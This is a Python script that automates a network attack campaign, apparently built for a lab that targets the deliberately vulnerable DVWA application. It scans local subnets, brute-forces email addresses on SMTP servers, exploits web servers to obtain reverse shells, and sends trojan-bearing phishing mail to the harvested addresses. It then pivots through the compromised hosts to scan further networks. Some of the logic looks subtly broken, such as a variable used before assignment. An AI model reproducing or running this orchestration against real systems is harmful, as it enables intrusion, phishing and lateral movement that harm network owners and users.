import json
import socket
import netifaces
import threading
from attackLib import dvwa_attack, Supply_chain_attack, Mail_physhing_trojan, scan_subnet, scan_subnet_remote, Brute_force_email_addresses

def attack_cycle(args):
    """ Execute multiple attack and scan as new workstations and servicesare discovered.
        args (dict of str): This argument list maps arguments and their value.
            {
                my_smtp_server (str): This value is .
                email_hacker (str): This value is the hacker's email address.
            }
    
    Returns:
        None
    """
    my_informations = []
    for interface in netifaces.interfaces():
        if interface != "lo" and interface != "eth0":
            mac = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]["addr"]
            ip_v4 = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]["addr"]
            netmask = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]["netmask"]
            my_informations.append({"ip_v4":ip_v4,"mac_address":mac,"netmask":netmask})

    hosts_info = []
    email_detected = []
    dvwa_host_already_hack = []
    smtp_host_already_hack = []
    emails_users_already_attack = []
    reverse_shell_already_scan = []

    for interface in my_informations:
        hosts_info = sum([hosts_info, scan_subnet(interface["ip_v4"], interface["netmask"])], [])

    reverse_shells = []
    smtp_threads = []
    physhing_threads = []
    infected_libs_threads = []

    while True:
        for host in hosts_info:
            if (("25" in host["ports"]) and (host["ip_v4"] not in smtp_host_already_hack)):
                try:
                    smtp_host_already_hack.append(host["ip_v4"])
                    socket.gethostbyaddr(host["ip_v4"])
                    smtp_threads.append(Brute_force_email_addresses(host["ip_v4"]))
                    smtp_threads[-1].start()
                except:
                    pass
            if (("80" in host["ports"]) and (host["ip_v4"] not in dvwa_host_already_hack)):
                dvwa_host_already_hack.append(host["ip_v4"])
                if reverse_shell != 1:
                    try:
                        reverse_shell = dvwa_attack("http://"+socket.gethostbyaddr(host["ip_v4"])[0])
                    except:
                        print(host["ip_v4"])
            elif (("443" in host["ports"]) and (host["ip_v4"] not in dvwa_host_already_hack)):
                dvwa_host_already_hack.append(host["ip_v4"])
                try:
                    reverse_shell = dvwa_attack("https://"+socket.gethostbyaddr(host["ip_v4"])[0])
                except:
                    pass
                if reverse_shell != 1:
                    reverse_shells.append(reverse_shell)

        for thread in smtp_threads:
                if thread.is_alive() == False and thread.already_return == False:
                    thread.already_return = True
                    email_detected = list(set(sum([email_detected, thread.users_list], [])))
                    for email in email_detected:
                        if email not in emails_users_already_attack:
                            for info in my_informations:
                                physhing_threads.append(Mail_physhing_trojan(info["ip_v4"], email, args["my_smtp_server"], args["email_hacker"]))
                                physhing_threads[-1].start()
        for thread in physhing_threads:
            if thread.is_alive() == False and thread.already_return == False:
                thread.already_return = True
                if thread.client != 1:
                    reverse_shells.append(thread.client)

        for thread in infected_libs_threads:
            if thread.is_alive() == False and thread.already_return == False:
                thread.already_return = True
                if thread.client != 1:
                    reverse_shells.append(thread.client)


        for reverse_shell in reverse_shells:
            if reverse_shell not in reverse_shell_already_scan:
                reverse_shell_already_scan.append(reverse_shell)
                hosts_info = sum([hosts_info, scan_subnet_remote(reverse_shell)], [])
                tmp_hosts_info = []
                for i in range(len(hosts_info)):
                    if hosts_info[len(hosts_info)-i-1] not in hosts_info[:len(hosts_info)-i-2]:
                        tmp_hosts_info.append(hosts_info[i])
                hosts_info = tmp_hosts_info

    print("hosts_info:", hosts_info)
    print("email_detected:", email_detected)
    print("dvwa_host_already_hack: ", dvwa_host_already_hack)
    print("smtp_host_already_hack:", smtp_host_already_hack)

# args = {"my_smtp_server":"1.1.1.2", "email_hacker":"hacker@host.com"}
# attack_cycle(args)